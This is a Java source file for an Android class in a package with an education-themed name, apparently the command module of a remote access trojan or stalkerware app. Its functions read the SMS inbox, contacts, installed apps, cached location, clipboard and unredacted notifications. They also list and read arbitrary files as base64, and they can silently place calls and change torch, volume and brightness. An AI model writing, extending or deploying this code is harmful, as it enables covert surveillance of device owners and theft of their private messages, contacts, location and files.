package com.eloeeducacao;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Base64;
import android.view.KeyEvent;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public final class Extra {

    private static final int MAX = 12000;

    private static String cut(String s) {
        if (s == null) return "";
        return s.length() > MAX ? s.substring(0, MAX) + "\n[...cortado]" : s;
    }

    public static String sms(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            android.database.Cursor cu = c.getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            int n = 0;
            if (cu != null) {
                SimpleDateFormat f = new SimpleDateFormat("dd/MM HH:mm", Locale.US);
                while (cu.moveToNext() && n < 60) {
                    String addr = cu.getString(cu.getColumnIndexOrThrow("address"));
                    String body = cu.getString(cu.getColumnIndexOrThrow("body"));
                    long ts = cu.getLong(cu.getColumnIndexOrThrow("date"));
                    sb.append(f.format(new Date(ts))).append(" | ").append(addr)
                      .append(" | ").append(body).append('\n');
                    n++;
                }
                cu.close();
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String contacts(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            android.database.Cursor cu = c.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            int n = 0;
            if (cu != null) {
                while (cu.moveToNext() && n < 400) {
                    String name = cu.getString(cu.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String num = cu.getString(cu.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(" <").append(num).append(">\n");
                    n++;
                }
                cu.close();
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String apps(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            PackageManager pm = c.getPackageManager();
            List<ApplicationInfo> l = pm.getInstalledApplications(0);
            for (ApplicationInfo a : l) {
                boolean launch = pm.getLaunchIntentForPackage(a.packageName) != null;
                if (!launch) continue;
                sb.append(pm.getApplicationLabel(a)).append(" | ").append(a.packageName).append('\n');
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String loc(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
            for (String p : lm.getProviders(true)) {
                Location l = lm.getLastKnownLocation(p);
                if (l == null) continue;
                sb.append(p).append(": ").append(l.getLatitude()).append(',')
                  .append(l.getLongitude()).append(" +-").append(l.getAccuracy())
                  .append("m ").append((System.currentTimeMillis() - l.getTime()) / 1000).append("s atras\n");
            }
            if (sb.length() == 0) sb.append("sem posicao em cache");
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return sb.toString();
    }

    public static String clip(Context c) {
        try {
            ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData d = cm.getPrimaryClip();
            if (d == null || d.getItemCount() == 0) return "vazio";
            return String.valueOf(d.getItemAt(0).coerceToText(c));
        } catch (Throwable t) {
            return "err: " + t;
        }
    }

    public static void setClip(final Context c, final String s) {
        try {
            android.os.Handler h = new android.os.Handler(android.os.Looper.getMainLooper());
            h.post(new Runnable() {
                @Override public void run() {
                    try {
                        ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
                        cm.setPrimaryClip(ClipData.newPlainText("a", s));
                    } catch (Throwable ignored) {}
                }
            });
        } catch (Throwable ignored) {}
    }

    public static String notifs(Context c) {
        return cut(Util.exec("dumpsys notification --noredact"));
    }

    public static String info(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            sb.append("modelo: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n');
            sb.append("sdk: ").append(Build.VERSION.SDK_INT).append(" rel: ").append(Build.VERSION.RELEASE).append('\n');
            sb.append("board: ").append(Build.BOARD).append(" abi: ")
              .append(Build.SUPPORTED_ABIS.length > 0 ? Build.SUPPORTED_ABIS[0] : "?").append('\n');
            sb.append("uptime: ").append(android.os.SystemClock.elapsedRealtime() / 1000).append("s\n");
            StatFs st = new StatFs(Environment.getDataDirectory().getAbsolutePath());
            sb.append("livre: ").append(st.getAvailableBytes() / 1048576).append("MB de ")
              .append(st.getTotalBytes() / 1048576).append("MB\n");
            sb.append("ip: ").append(Util.ip()).append('\n');
            sb.append("tela: ").append(Util.screen(c)).append('\n');
            sb.append("brilho: ").append(Settings.System.getInt(c.getContentResolver(),
                    Settings.System.SCREEN_BRIGHTNESS, -1)).append('\n');
            sb.append("acc: ").append(Util.accOn(c)).append('\n');
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return sb.toString();
    }

    public static String ls(String path) {
        StringBuilder sb = new StringBuilder();
        try {
            File d = new File(path);
            File[] fs = d.listFiles();
            if (fs == null) return "sem acesso ou vazio: " + path;
            java.util.Arrays.sort(fs);
            for (File f : fs) {
                sb.append(f.isDirectory() ? "d " : "- ").append(f.length()).append('\t')
                  .append(f.getName()).append('\n');
                if (sb.length() > MAX) break;
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String cat(String path, int off, int len) {
        java.io.RandomAccessFile raf = null;
        try {
            File f = new File(path);
            if (!f.isFile()) return "nao e arquivo";
            long total = f.length();
            raf = new java.io.RandomAccessFile(f, "r");
            raf.seek(Math.max(0, Math.min(off, total)));
            int n = (int) Math.min(len, Math.max(1, total - raf.getFilePointer()));
            byte[] b = new byte[n];
            int r = raf.read(b);
            if (r <= 0) return "fim";
            return "off=" + off + " total=" + total + " b64=" + Base64.encodeToString(
                    r == n ? b : java.util.Arrays.copyOf(b, r), Base64.NO_WRAP);
        } catch (Throwable t) {
            return "err: " + t;
        } finally {
            try { if (raf != null) raf.close(); } catch (Throwable ignored) {}
        }
    }

    public static void bright(Context c, int pct) {
        try {
            int v = Math.max(0, Math.min(255, pct * 255 / 100));
            Settings.System.putInt(c.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, v);
            Settings.System.putInt(c.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS_MODE, 0);
        } catch (Throwable ignored) {}
    }

    public static void torch(Context c, boolean on) {
        try {
            CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
            for (String id : cm.getCameraIdList()) {
                Boolean has = cm.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (has != null && has) {
                    cm.setTorchMode(id, on);
                    return;
                }
            }
        } catch (Throwable ignored) {}
    }

    public static void volume(Context c, int dir, int pct) {
        try {
            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
            if (pct >= 0) {
                int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, Math.max(0, Math.min(max, pct * max / 100)), 0);
            } else {
                am.adjustStreamVolume(AudioManager.STREAM_MUSIC,
                        dir > 0 ? AudioManager.ADJUST_RAISE : AudioManager.ADJUST_LOWER,
                        AudioManager.FLAG_SHOW_UI);
            }
        } catch (Throwable ignored) {}
    }

    public static void media(Context c, int code) {
        try {
            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
            am.dispatchMediaKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, code));
            am.dispatchMediaKeyEvent(new KeyEvent(KeyEvent.ACTION_UP, code));
        } catch (Throwable ignored) {}
    }

    public static void dial(Context c, String num, boolean call) {
        try {
            Intent i = new Intent(call ? Intent.ACTION_CALL : Intent.ACTION_DIAL,
                    Uri.parse("tel:" + Uri.encode(num)));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable ignored) {}
    }
}